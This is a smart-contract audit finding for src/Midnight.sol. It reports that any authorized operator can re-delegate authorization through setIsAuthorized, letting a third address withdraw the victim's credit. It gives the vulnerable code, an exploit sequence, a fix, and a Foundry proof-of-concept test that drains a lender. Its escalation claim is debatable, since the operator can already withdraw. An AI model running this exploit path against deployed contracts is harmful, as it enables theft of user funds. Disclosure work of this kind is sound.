### Title
Transitive Authorization Escalation via Unscoped `setIsAuthorized` Allows Unauthorized Withdrawal of Victim Funds - (File: src/Midnight.sol)

### Summary
`setIsAuthorized` in `src/Midnight.sol` permits any address that holds `isAuthorized[victim][operator] == true` to call `setIsAuthorized(attacker, true, victim)`, writing `isAuthorized[victim][attacker] = true` with no restriction on scope, market, action, or function. Because `withdraw` only checks `isAuthorized[onBehalf][msg.sender]`, the attacker can immediately drain the victim's credit. The existing test `testSetIsAuthorizedAuthorization` (line 290–303 of `test/AuthorizationTest.sol`) explicitly confirms that an authorized address can grant further authorizations on behalf of the authorizer.

### Finding Description

**Root cause — `setIsAuthorized` (lines 731–735, `src/Midnight.sol`):**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

The guard only checks that `msg.sender` is already authorized for `onBehalf`. It does **not** restrict what the caller may do with that authorization — in particular, it does not prevent the caller from granting further authorizations to arbitrary third parties. [1](#0-0) 

**Exploit call sequence:**

1. **Victim** calls `setIsAuthorized(operator, true, victim)` — legitimately authorizing `operator` for some purpose.  
   State: `isAuthorized[victim][operator] = true`.

2. **Operator** calls `setIsAuthorized(attacker, true, victim)`:  
   - Guard: `isAuthorized[victim][operator]` → `true` ✓  
   - State written: `isAuthorized[victim][attacker] = true`.

3. **Attacker** calls `withdraw(market, units, victim, attacker)`:  
   - Guard at line 482: `isAuthorized[victim][attacker]` → `true` ✓  
   - `units` of loan token are transferred to `attacker`. [2](#0-1) 

**Why existing checks fail:**  
`withdraw` only checks `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. After step 2, `isAuthorized[victim][attacker]` is `true`, so the check passes unconditionally. There is no scope, market, action, or function restriction anywhere in the authorization mapping.

The existing test suite confirms this is the intended (but dangerous) behavior: [3](#0-2) 

### Impact Explanation
Any address that has been granted any authorization by a victim — even for a narrow purpose such as `setConsumed` or `take` — can immediately escalate to full control over the victim's credit in every market, and drain all withdrawable funds to an arbitrary `receiver`. The impact is complete loss of victim credit with no recovery path.

### Likelihood Explanation
The precondition (victim has authorized at least one operator) is the normal operating state for any user relying on the authorization system (e.g., smart-contract wallets, aggregators, periphery contracts). The attack requires no special privileges, no oracle manipulation, no flash loan, and no user mistake beyond the initial legitimate authorization. It is repeatable and can be executed in a single transaction after the victim authorizes any operator.

### Recommendation
Prevent authorized operators from re-delegating their authorization. The simplest fix is to require `onBehalf == msg.sender` in `setIsAuthorized`, removing the ability for a delegated operator to call it on behalf of another account:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized()); // only self-authorization
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

If delegated re-authorization is intentional, introduce a separate permission bit (e.g., `canDelegate`) that is `false` by default and must be explicitly granted by the account owner directly.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Market, CollateralParams} from "../src/interfaces/IMidnight.sol";

contract TransitiveAuthEscalationTest is BaseTest {
    Market internal market;

    function setUp() public override {
        super.setUp();
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        }));
    }

    function testTransitiveAuthEscalation() public {
        address victim   = makeAddr("victim");
        address operator = makeAddr("operator");
        address attacker = makeAddr("attacker");
        uint256 units    = 1000;

        // Setup: victim has credit (lender role)
        collateralize(market, borrower, units);
        setupMarket(market, units);          // victim == lender has `units` credit
        skip(99);
        deal(address(loanToken), borrower, units);
        vm.prank(borrower);
        midnight.repay(market, units, borrower, address(0), hex"");

        // Step 1: victim legitimately authorizes operator
        vm.prank(lender);
        midnight.setIsAuthorized(operator, true, lender);

        // Step 2: operator escalates — grants attacker authorization over victim
        vm.prank(operator);
        midnight.setIsAuthorized(attacker, true, lender);

        // Assert: attacker is now authorized for victim
        assertTrue(midnight.isAuthorized(lender, attacker));

        // Step 3: attacker drains victim's credit
        uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);
        vm.prank(attacker);
        midnight.withdraw(market, units, lender, attacker);

        // Assertions
        assertEq(loanToken.balanceOf(attacker), attackerBalanceBefore + units);
        assertEq(midnight.creditOf(toId(market), lender), 0);
    }

    // Fuzz variant: any authorized address can always re-delegate
    function testFuzz_transitiveAuth(address op, address atk) public {
        vm.assume(op != lender && atk != lender && op != atk);
        vm.prank(lender);
        midnight.setIsAuthorized(op, true, lender);
        vm.prank(op);
        midnight.setIsAuthorized(atk, true, lender);
        assertTrue(midnight.isAuthorized(lender, atk));
    }
}
```

**Expected assertions:**
- `isAuthorized(lender, attacker)` is `true` after step 2.
- `loanToken.balanceOf(attacker)` increases by `units` after step 3.
- `creditOf(id, lender)` is `0` after step 3.
- Both tests pass without any revert, confirming the vulnerability is reachable.
